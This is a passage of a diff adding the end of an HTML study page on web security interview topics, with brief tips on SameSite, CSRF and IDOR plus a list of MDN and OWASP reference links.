+      <li><strong>SameSite vs Same-Origin.</strong> Getting the site-vs-origin distinction right marks a senior candidate.</li>
+      <li><strong>HttpOnly does not stop CSRF.</strong> The follow-up question everyone gets wrong.</li>
+      <li><strong>Object-level authZ.</strong> IDOR/BOLA is the #1 API vuln in OWASP; volunteering it shows you've done this in prod.</li>
+    </ul>
+  </section>
+
+  <!-- ============================ FAQ ============================ -->
+  <section id="faq" class="card faq">
+    <span class="badge">❓ FAQ — your follow-up questions</span>
+    <h2>Questions asked about this topic</h2>
+    <p style="color:var(--muted)">No follow-up questions yet — ask one about this topic and it'll be logged here with a compact answer.</p>
+  </section>
+
+  <!-- ============================ SOURCES ============================ -->
+  <section id="sources" class="card sources">
+    <h2>📚 Sources</h2>
+    <ul>
+      <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">MDN — Cross-Origin Resource Sharing (CORS)</a> — canonical reference for simple vs preflighted requests and every <code>Access-Control-*</code> header.</li>
+      <li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">MDN — Same-Origin Policy</a> — how SOP defines "origin" and what it does and does not block.</li>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP — CSRF Prevention Cheat Sheet</a> — SameSite, synchronizer token, origin/referer check patterns.</li>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP — XSS Prevention Cheat Sheet</a> — context-aware encoding rules for HTML, JS, CSS, URL contexts.</li>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html">OWASP — Content Security Policy Cheat Sheet</a> — nonce-based and hash-based CSP recipes.</li>
+      <li><a href="https://owasp.org/API-Security/editions/2023/en/0x11-t10/">OWASP API Security Top 10 (2023)</a> — BOLA/IDOR, broken authentication, and other API-specific classes.</li>
+      <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie">MDN — Set-Cookie</a> — full reference for HttpOnly, Secure, SameSite, Domain, Path attributes.</li>
+      <li><a href="https://web.dev/articles/samesite-cookies-explained">web.dev — SameSite cookies explained</a> — practical guidance on Lax vs Strict vs None.</li>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP — SQL Injection Prevention Cheat Sheet</a> — parameterised queries as the primary defense.</li>
+      <li><a href="https://learn.microsoft.com/en-us/aspnet/core/security/anti-request-forgery">ASP.NET Core — Anti-request Forgery (CSRF)</a> — anti-forgery token usage in .NET APIs and MVC apps.</li>
+    </ul>
+  </section>
+
+  <footer>Generated by the <strong>design-research</strong> skill · researched via web search · open via localhost</footer>
+</div>
+<script src="../../nav.js"></script>
+</body>
+</html>
